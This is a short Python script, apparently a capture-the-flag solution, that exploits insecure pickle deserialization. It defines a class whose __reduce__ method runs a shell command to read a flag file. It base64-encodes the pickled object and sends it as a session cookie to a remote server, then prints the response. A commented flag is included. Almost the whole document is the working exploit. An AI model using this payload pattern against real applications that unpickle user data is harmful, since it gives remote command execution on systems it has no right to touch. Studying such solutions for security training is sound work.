import requests
import pickle
from base64 import b64encode
from subprocess import check_output


class Exploit:
    def __reduce__(self):
        return (check_output, (["cat", "/flag_5fb2acebf1d0c558"],))


payload = b64encode(pickle.dumps({"name": Exploit(), "age": "pekomiko"})).decode()
r = requests.get("http://h4ck3r.quest:8400/", cookies={"session": payload})
print(r.text)

# FLAG{p1ckle_r1ck}
